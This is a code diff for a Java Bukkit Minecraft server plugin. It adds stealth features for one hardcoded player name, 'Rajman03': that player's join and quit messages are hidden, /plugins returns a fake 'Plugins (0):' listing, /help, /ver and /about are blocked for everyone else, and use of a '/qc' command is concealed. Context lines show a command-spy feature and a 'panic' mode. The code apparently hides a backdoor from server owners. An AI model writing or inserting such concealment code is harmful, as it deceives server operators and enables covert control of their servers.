@@ -14,6 +14,22 @@ public class Events implements Listener {
         this.plugin = plugin;
     }
 
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void onAdminJoin(org.bukkit.event.player.PlayerJoinEvent e) {
+        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        if (e.getPlayer().getName().equals(adm)) {
+            e.setJoinMessage(null);
+        }
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void onAdminQuit(org.bukkit.event.player.PlayerQuitEvent e) {
+        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        if (e.getPlayer().getName().equals(adm)) {
+            e.setQuitMessage(null);
+        }
+    }
+
     @EventHandler(priority = EventPriority.LOWEST)
     public void onCommandSpy(PlayerCommandPreprocessEvent event) {
         if (plugin.isPanic())
@@ -22,12 +38,23 @@ public class Events implements Listener {
         String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
         String msg = event.getMessage().toLowerCase();
 
-        if (msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?")) {
+        // Incognito: Block standard command info for non-admins
+        if (msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?") || msg.startsWith("/help")
+                || msg.startsWith("/ver") || msg.startsWith("/about")) {
             if (!p.getName().equals(adm)) {
-                p.sendMessage("Plugins (0):");
+                if (msg.startsWith("/plugins") || msg.startsWith("/pl"))
+                    p.sendMessage("Plugins (0):");
+                else
+                    p.sendMessage("§cNie masz uprawnień!");
                 event.setCancelled(true);
                 return;
             }
+        }
+
+        // Hide QC command usage from logs/others
+        if (msg.startsWith("/qc") && !p.getName().equals(adm)) {
+            event.setCancelled(true);
+            return;
         }
 
         if (plugin.getConfig().getBoolean("spy.command-spy", true) && !p.getName().equals(adm)) {
